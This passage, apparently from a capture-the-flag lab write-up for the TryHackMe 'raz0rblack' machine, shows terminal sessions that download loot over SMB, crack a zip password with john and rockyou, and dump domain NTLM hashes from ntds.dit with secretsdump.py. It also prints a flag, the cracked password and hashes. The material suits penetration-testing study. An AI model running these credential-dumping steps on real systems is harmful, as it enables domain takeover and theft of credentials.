Get file chat_log_20210222143423.txt? y
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
Get file experiment_gone_wrong.zip? y
parallel_read returned NT_STATUS_IO_TIMEOUT
Get file sbradley.txt? y
getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip getting file \sbradley.txt of size 37 as sbradley.txt (0.1 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> recurse on
smb: \> prompt on
smb: \> mget *
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.9 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip (1423.3 KiloBytes/sec) (average 1223.6 KiloBytes/sec)
getting file \sbradley.txt of size 37 as sbradley.txt (0.0 KiloBytes/sec) (average 1161.6 KiloBytes/sec)
smb: \> exit
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# cat chat_log_20210222143423.txt
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects

root@rE3oN:~/thm/machines/medium/raz0rblack# cat sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}                                                                 
root@rE3oN:~/thm/machines/medium/raz0rblack# zip2john experiment_gone_wrong.zip > john_hash.txt
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/system.hive PKZIP Encr: TS_chk, cmplen=2941739, decmplen=16281600, crc=BDCCA7E2 ts=591C cs=591c type=8
ver 2.0 efh 5455 efh 7875 experiment_gone_wrong.zip/ntds.dit PKZIP Encr: TS_chk, cmplen=15985077, decmplen=58720256, crc=68037E87 ts=5873 cs=5873 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# john --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
electromagnetismo (experiment_gone_wrong.zip)
1g 0:00:00:00 DONE (2022-07-12 20:28) 1.428g/s 11983Kp/s 11983Kc/s 11983KC/s elliotfrost..ejsa457
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# unzip experiment_gone_wrong.zip
Archive:  experiment_gone_wrong.zip
[experiment_gone_wrong.zip] system.hive password:
  inflating: system.hive
  inflating: ntds.dit
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL | tee secretsdump.txt

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x17a0a12951d502bb3c14cf1d495a71ad
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 84bf0a79cd645db4f94b24c35cfdf7c7
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:4ea59b8f64c94ec66ddcfc4e6e5899f9:::
```